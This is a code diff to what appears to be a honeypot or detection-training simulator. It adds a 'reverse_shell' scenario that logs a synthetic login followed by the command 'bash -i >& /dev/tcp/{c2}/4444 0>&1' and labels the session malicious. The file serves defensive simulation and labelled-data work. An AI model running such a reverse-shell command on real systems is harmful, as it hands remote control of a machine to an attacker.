@@ -330,6 +330,16 @@ def mirai_telnet(sim: Sim) -> None:
                           "then fetched and ran a Mirai build for its CPU from the campaign's C2.")
 
 
+def reverse_shell(sim: Sim) -> None:
+    """Interactive reverse shell back to a C2 - the post-compromise control channel."""
+    ip = sim.public_ip()
+    c2 = sim.infra("rs.c2", sim.server_ip)
+    sim.session(ip, sim.random_time(), sim.rng.choice(BOT_CLIENTS), [sim.rng.choice(WORKING_CREDS)], success=True,
+                commands=["uname -a", f"bash -i >& /dev/tcp/{c2}/4444 0>&1"])
+    sim.truth[ip] = Truth("reverse_shell", "malicious", "high",
+                          "Logged in and spawned an interactive reverse shell back to the attacker's C2.")
+
+
 SCENARIOS: dict[str, tuple[Callable[[Sim], None], int]] = {
     "bruteforce_only": (bruteforce_only, 6),
     "bruteforce_success_recon": (bruteforce_success_recon, 3),
@@ -344,6 +354,7 @@ SCENARIOS: dict[str, tuple[Callable[[Sim], None], int]] = {
     "scanner_noise": (scanner_noise, 15),
     # Appended last so the random stream - and every alert id - of the scenarios above is unchanged.
     "mirai_telnet": (mirai_telnet, 3),
+    "reverse_shell": (reverse_shell, 1),
 }
 
 
